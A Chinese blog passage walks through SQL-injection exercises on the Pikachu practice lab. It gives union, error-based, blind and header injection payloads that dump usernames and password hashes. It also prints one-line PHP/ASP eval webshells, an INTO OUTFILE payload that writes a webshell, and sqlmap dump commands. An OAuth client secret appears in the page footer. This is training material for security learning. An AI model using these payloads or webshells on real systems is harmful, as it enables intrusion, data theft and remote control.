<p>以字符型为例，我们站在测试者的角度判断是否存在sql注入，以及如何获取数据。<br>我们首先打开靶场的字符型，我们先输入个单引号，提交发现报错<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-34-21.png" alt="出错" class="lazyload"><br>在单引号处出现了语法错误，那么我们的单引号已经被拼接到sql中执行了，这就说明这里是sql注入点，他会把当前的输入当作数据库查询语句的一部分逻辑去处理。<br>我们猜测的是字符型的，去做一个小测试，输入<code>a&#39; or 1=1#</code>点击提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-39-55.png" alt="数据" class="lazyload"><br>结果发现可以遍历数据，但是现在的结果并不能满足我，我要获取他的基本信息，我们要使用union联合查询获取信息，首先我们需要使用order by来猜测字段数，输入<code>a&#39; order by 3#</code>出现报错，在输入<code>a&#39; order by 2#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-45-23.png" alt="猜字段" class="lazyload"><br>成功猜出主查询中有两个字段，确定字段数量后我要用联合查询来获取information_schema中的数据，至少要知道数据库名称，构造联合查询的语句<code>a&#39; union select database(),user()#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-48-26.png" alt="成功获取" class="lazyload"><br>成功获取到数据库的名称为pikachu。拿到名称后我们就可以通过information_schema去获取数据。通过union联合查询，然后通过information_schema去获取pikachu一共有多少个表，表的名称是什么<br>构造联合查询语句如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">a&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-16-57-01.png" alt="查表名" class="lazyload"><br>pikachu数据库所有表的名称被我们爆出来了，我们进一步分析，我们发现有一个叫做users的表，我们可以猜测这是存放用户名和密码的表，构造联合查询通过information_schema表查询出users表的字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">a&#x27; union select table_name,column_name from information_schema.columns where table_name=&#x27;users&#x27;#<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-01-38.png" alt="表的字段名" class="lazyload"><br>我们发现有账号和密码，现在来获取账号和密码，union联合查询的语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">a&#x27; union select username,password from users#<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-04-10.png" alt="账号密码" class="lazyload"></p>
<p>账号密码到手，但发现密码是经过加密处理的，通过长度判断应该是md5加密，通过网上碰撞解出密文。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-17-06-46.png" alt="解密密码" class="lazyload"><br>这时我们的目的已经达成获取到了管理员的账号和密码。</p>
<h5 id="SQL-Inject漏洞手工测试基于报错信息获取（select-delete-update-insert）"><a href="#SQL-Inject漏洞手工测试基于报错信息获取（select-delete-update-insert）" class="headerlink" title="SQL Inject漏洞手工测试基于报错信息获取（select/delete/update/insert）"></a>SQL Inject漏洞手工测试基于报错信息获取（select/delete/update/insert）</h5><p>技巧思路：在mysql中使用一些指定的函数来制造报错，从而报错信息中获取设定的信息。<br>select/insert/update/delete都可以用来报错获取信息<br>背景条件：后台没有屏蔽数据库报错信息，在语法发生错误时会在前端输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">基于报错的信息获取——三个常用的用来报错的函数<br>updatexml() :函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。<br>extractvalue():函数也是MYSQL对XML文档数据进行查询的XPATH函数。<br>floor(): MYSQL中用来取整的函数。<br></code></pre></td></tr></table></figure>

<p>**updatexml():**作用：改变（查找并替换）xml文档中符合条件的节点的值<br>语法:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">UPDATEXML(xml document,XPathstring,new_value)<br>第一个参数：fiedname是string格式，为表中的字段名<br>第二个参数：XPathstring（Xath格式的字符串）<br>第三个参数：new.balue,String格式，替换查找到的符合条件的<br></code></pre></td></tr></table></figure>

<p>Xpath定位必须是有效的，否则会发生错误。</p>
<p><strong>Select下报错的利用：</strong><br>我们还是打开字符型注入，首先判断有没有报错，会不会在前端显示，我们输入单引号发现有注入报错。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-46-09.png" alt="单引号出错" class="lazyload"><br>现在构造一个报错：<code>a&#39; and updatexml(1,version(),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-48-33.png" alt="构造语句测试" class="lazyload"><br>出现.26，并没有把对应的版本号爆出来，现在对语句修改：<br><code>a&#39; and updatexml(1,concat(0x7e,version()),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-52-22.png" alt="成功获取到版本" class="lazyload"><br>成功获取到版本号，我们可以把version替换成任意我们想要获得的东西<br><code>a&#39; and updatexml(1,concat(0x7e,database()),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-54-29.png" alt="获取数据库名" class="lazyload"><br>获取到数据库名，进行进一步查询<br><code>a&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39;)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-56-37.png" alt="尝试查表名" class="lazyload"><br>报错返回数据多余一行，说明报错有多行。可以使用limityici一次获取表名信息<br><code>a&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-59-43.png" alt="获取表名" class="lazyload"><br>我们可以得到第一个表名。想要得到第二个表名只要把limit后边的第一个0改成1即可。依此类推，可以得到所有表名。到第三个的时候获取到user表名<br><code>a&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-04-25.png" alt="user表名获取" class="lazyload"><br>在获取表名之后，思路一样，获取列名<br><code>a&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-07-27.png" alt="获取列名" class="lazyload"><br>同样的依此类推得到所有列名后再来获取数据<br><code>a&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-09-29.png" alt="数据" class="lazyload"><br>获取了第一个用户名，再根据用户名查询密码<br><code>a&#39; and updatexml(1,concat(0x7e,(select password from users where username=&#39;admin&#39; limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-10-49.png" alt="密码" class="lazyload"><br>获取到md5加密的密文，在网站中撞库解密密文获取明文密码。</p>
<p><strong>insert/update注入利用</strong><br>我们打开靶场点击注册<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-15-23.png" alt="注册" class="lazyload"><br>一样的方法判断是否有注入漏洞加个单引号看是否报错<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-38-14.png" alt="判断注入点" class="lazyload"><br>经判断存在sql注入漏洞，重点是如何利用，如何构造闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">用户名输入: a&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;<br></code></pre></td></tr></table></figure>

<p>密码随便输，点击提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-39-28.png" alt="注入成功" class="lazyload"><br>成功得到数据库名。思路一样将database做替换，得到想要的信息<br>update与insert是一模一样的，我们先登录用户。<br>在这里可能会有人显示不出来信息，可以参考解决方案。<br>在使用pikachu的时候发现一点问题，好像是由php版本较高导致的不兼容，如图：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-44-06.png" alt="报错" class="lazyload"><br>在这里我们打开这个路径，找到第70行，把MYSQL_ASSOC改成MYSQLI_ASSOC，保存文件，刷新网页。就可以啦。<br>原因：在php7中，MYSQL_ASSOC不再是一个常量，将 MYSQL_ASSOC改为MYSQLI_ASSOC，意思是mysqli的方式提取数组，而不再是mysql 。（原因：mysql_fetch_arrayhan函数转为mysqli_fetch_array，参数没有修改）<br>修改后恢复正常<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-48-46.png" alt="问题解决" class="lazyload"><br>尝试注入的流程<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-01-52.png" alt="更新注入流程" class="lazyload"><br>爆出数据库名称，之后逻辑就一样了。</p>
<p><strong>delete注入利用</strong><br>打开delete注入靶场，添加几条评论<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-17-31.png" alt="打开靶场" class="lazyload"><br>点击删除留言，留言被删除，我们打开burp查看抓到的数据包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-20-13.png" alt="数据包" class="lazyload"><br>将数据包发送到repeater模块中，get后边的id可以注入，构成闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1 or updatexml(1,concat(0x7e,database()),0)<br></code></pre></td></tr></table></figure>

<p>数据包修改操作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-29-23.png" alt="改包" class="lazyload"><br>点击go执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-30-22.png" alt="执行" class="lazyload"><br>出现数据库名，剩下的操作就是更换database获取信息</p>
<p><strong>extractvalue()</strong><br>extractvalue()函数作用:从目标XML中返回包含所查询值的字符串。<br>语法: ExtractValue(xml _document, xpath. string)</p>
<ul>
<li>第一个参数：xml _document是string格式，为xml文档对象的名称，文中为Doc</li>
<li>第二个参数：xpath. string(xpath格式的字符串)</li>
</ul>
<p>Xpath定位必须是有效的,否则会发生错误。<br>打开字符型注入，输入payload:<code>kobe&#39; and extractvalue(0,concat(0x7e,version()))#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-35-16.png" alt="执行" class="lazyload"><br>效果差不多</p>
<p><strong>floor()</strong><br>字符型中输入payload：<code>kobe&#39; and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-37-26.png" alt="效果" class="lazyload"><br>原理都差不多都是报错显示信息，区别是使用的函数也不一样，构造的语句也不同</p>
<h5 id="SQL注入漏洞-基于http-header的注入"><a href="#SQL注入漏洞-基于http-header的注入" class="headerlink" title="SQL注入漏洞-基于http header的注入"></a>SQL注入漏洞-基于http header的注入</h5><p>什么是http header注入：后台开发人员为了验证客户端头信息(比如常用的cookie验证)或者通过http header头信息获取客户端的一些信息，比如useragent、accept字段等等。会对客户端的http header信息进行获取并使用SQL进行处理,如果此时没有足够的安全考虑，则可能会导致基于http header的SQL Inject漏洞。<br>漏洞演示：<br>打开靶场点击提示获得账号密码登录<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-43-35.png" alt="登录" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-45-48.png" alt="登录后页面" class="lazyload"><br>可以看到http头信息展示到了前端页面，说明后台对http头数据进行了获取，进行了数据库操作，打开burp的数据包发送到repeater中进行测试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-55-27.png" alt="寻找注入" class="lazyload"><br>找到注入我们输入payload：<code>firefox&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-57-26.png" alt="利用成功" class="lazyload"><br>返回了数据库名称</p>
<h5 id="SQL注入漏洞-盲注"><a href="#SQL注入漏洞-盲注" class="headerlink" title="SQL注入漏洞-盲注"></a>SQL注入漏洞-盲注</h5><p>什么是盲注？<br>在有些情况下,后台使用了错误消息屏蔽方法(比如@ )屏蔽了报错<br>此时无法在根据报错信息来进行注入的判断。这种情况下的注入，称为“盲注”根据表现形式的不同，盲注又分为based boolean和based time两种类型</p>
<p><strong>基于boolean的盲注</strong><br>表现症状：</p>
<ol>
<li>没有报错信息</li>
<li>不管正确输入还是错误输入都只显示0或1</li>
<li>在正确的输入下，输入 and 1=1 或者 and 1=2 发现可以判断</li>
</ol>
<p>测试演示：<br>打开boolean盲注，输入<code>kobe&#39; and 1=1#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-07-30.png" alt="流程" class="lazyload"><br>对比说明存在sql注入漏洞，我们尝试之前的方法发现都行不通<br>只能重新构造语句<code>kobe&#39; and ascii(substr(database(),1,1))&gt;113#</code><br>查询显示不存在<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-10-52.png" alt="查询" class="lazyload"><br>修改大于号后边的值<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-24-38.png" alt="修改" class="lazyload"><br>一次修改猜第二个字符的语句为<code>kobe&#39; and ascii(substr(database(),2,1))&gt;105#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-28-44.png" alt="第二个字符" class="lazyload"><br>只能一个一个试出来，这样思路就有了。</p>
<p><strong>基于timebase的盲注</strong><br>如果说基于boolean的窗注在页面上还可以看到0 or 1的回显的话那么基于time的盲注完全就啥都看不到了!但还有一个条件，就是“时间”， 通过特定的输入，判断后台执行的时间,从而确认注入!<br>常用的teat payload：<code>kobe’ and sleep(5)#</code><br>打开基于时间的盲注靶场输入kobe和payload查看区别，从而判断这里存在basedtime sql inject<br>输入单引号查看时无反应，进行其他尝试也是无反应，然后输入时间盲注的payload查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-09-51-43.png" alt="验证时间盲注" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-09-56-04.png" alt="数据包分析" class="lazyload"><br>可以看到有一个请求有5毫秒多的延时说明我们的payload中的延时函数成功执行。<br>我们构造一个payload来猜解出数据库构造语句<code>kobe&#39; and if((substr(database(),1,1))=&#39;p&#39;,sleep(5),null)#</code>意思是如果数库名的第一个字符等于p时延时5秒否则不延时，网页返回时间有延时说明第一个字符是p，不延时则不是p，然后思路就和布尔盲注的思路一样猜解、替换database</p>
<h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><p>一句话木马：是一种短小而精悍的木马客户端，隐蔽性好，功能强大<br>php的一句话：<code>&lt; ?php @eval($_ POST&#39;chopper&#39;]);?&gt;</code><br>asp的一句话：<code>&lt; %eval request(&quot;chopper&quot;)%&gt;</code><br>asp.net的一句话：<code>&lt;%@ Page Language= Jscript” %&gt; &lt;%eval(Request.Item[&quot;chopper&quot;]), “unsafe );%&gt;</code></p>
<p>select 1,2 into outfile “/var/www/html/1.txt”<br>into outfile 将select的结果写入到指定的目录的1.txt</p>
<p>在没有回显的注入中可以使用into outfile将一句话写入到文件然后获取权限，前提：</p>
<ol>
<li>需要知道远程目录</li>
<li>需要远程目录有写入权限</li>
<li>需要数据库开启secure_file_priv</li>
</ol>
<p>字符型注入写入一句话木马获取权限：<br>payload：<code>kobe&#39; union select &quot;&lt;?php @eval($_GET[&#39;test&#39;])?&gt;&quot;,2 into outfile &quot;C:/phpstudy_pro/WWW/pikachu/3.php&quot;#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-11-18.png" alt="流程" class="lazyload"><br>将一句话写入到目录下的3.php,用工具链接即可获取权限。</p>
<h5 id="SQL-Inject漏洞之表-列-名的暴力破解"><a href="#SQL-Inject漏洞之表-列-名的暴力破解" class="headerlink" title="SQL Inject漏洞之表(列)名的暴力破解"></a>SQL Inject漏洞之表(列)名的暴力破解</h5><p>打开字符型注，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">kobe&#x27; and exists(select * from aa)#<br>kobe&#x27; and exists(select id from users)#<br></code></pre></td></tr></table></figure>

<p>判断是否存在aa表，判断是否存在id在users表中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-15-35.png" alt="测试语句" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-17-43.png" alt="测试语句" class="lazyload"><br>可以看到第一个没有表，第二个成功返回页面信息，我们抓包，进行暴破表名：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-38-56.png" alt="暴破注入" class="lazyload"><br>同样的我们也可以用第二个payload暴破猜出列名。</p>
<h5 id="自动化注入攻击-SQL-MAP进行sql-inject攻击"><a href="#自动化注入攻击-SQL-MAP进行sql-inject攻击" class="headerlink" title="自动化注入攻击(SQL-MAP进行sql inject攻击)"></a>自动化注入攻击(SQL-MAP进行sql inject攻击)</h5><p>可以直接在官网下载压缩包：<br>sqlmap的经典用法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">1. python sqlmap.py -u &quot;url&quot; --cookie=&quot;yy&quot; #带上cookie对url进行注入探测<br>2. python sqlmap.py -u &quot;url&quot; --current-db #获取当前数据库名称<br>3. python sqlmap.py -u &quot;url&quot; --tables -D &quot;数据库名&quot; #列表名<br>4. python sqlmap.py -u &quot;url&quot; --columns -T &quot;表名&quot; -D &quot;数据库名&quot; -v 0 #列字段<br>5. python sqlmap.py -u &quot;url&quot; --dump -C &quot;字段名&quot; -T &quot;表名&quot; -D &quot;数据库&quot; -v 0 #获取字段内容<br>-r 文件名 #这种可以指定文件，用法用burp抓个包将数据包存为文件并在注入点出加一个*做标记<br></code></pre></td></tr></table></figure>

<p>-v x 参数介绍<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-13-18-19.png" alt="参数介绍" class="lazyload"></p>
<h5 id="SQL注入漏洞的常见防护措施"><a href="#SQL注入漏洞的常见防护措施" class="headerlink" title="SQL注入漏洞的常见防护措施"></a>SQL注入漏洞的常见防护措施</h5><p><strong>代码层面的防护：</strong></p>
<ol>
<li>对输入进行严格的转义和过滤</li>
<li>使用预处理和参数化(Parameterized)</li>
</ol>
<p><strong>网络层面：</strong></p>
<ol>
<li>通过waf设备启用防SQL注入策略或类似防护系统</li>
<li>云端防护(360网站卫士或阿里云盾)</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-12-14-40.png" alt="加waf" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-12-15-39.png" alt="加云端防护" class="lazyload"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>视频学习教程：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1KY4y1u7nk?p=2">https://www.bilibili.com/video/BV1KY4y1u7nk?p=2</a><br>pikachu场资源：<a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a><br>参考学习：<a target="_blank" rel="noopener" href="https://www.fkqq.fun/2022/07/11/pikachu/">https://www.fkqq.fun/2022/07/11/pikachu/</a></p>

  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>Jay jay<br>
        <strong>本文链接：</strong><a href="https://yyj-xx.github.io/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="https:&#x2F;&#x2F;yyj-xx.github.io&#x2F;2023&#x2F;03&#x2F;06&#x2F;pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;yyj-xx.github.io&#x2F;2023&#x2F;03&#x2F;06&#x2F;pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0&#x2F;</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
    
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a>
    
</div>

  
      <div class="nexmoe-post-footer">
          <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '906d60a925bbfc786e36',
        clientSecret: 'eef34b48d710958974d793333753521d0474c243',
        id: window.location.pathname,
        repo: 'yyj-xx.github.io',
        owner: 'yyj-xx',
        admin: 'yyj-xx'
    })
    gitalk.render('gitalk')
</script>
</section>
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">pikachu靶场的学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">pikachu介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">pikachu靶场的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E7%BB%83%E4%B9%A0"><span class="toc-number">1.3.</span> <span class="toc-text">pikachu靶场实战练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">暴力破解的流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%B5%81%E7%A8%8B%E5%92%8C%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">基于表单的暴力破解流程和配置工具过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94on-client%E2%80%94on-server"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">暴力破解之不安全的验证码分析—on client—on server</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AA%E5%9C%A8%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%EF%BC%88on-client%EF%BC%89"><span class="toc-number">1.3.1.3.1.</span> <span class="toc-text">只在前端验证的验证码（on client）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E5%90%8E%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%EF%BC%88on-server%EF%BC%89"><span class="toc-number">1.3.1.3.2.</span> <span class="toc-text">在后端校验的验证码（on server）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" 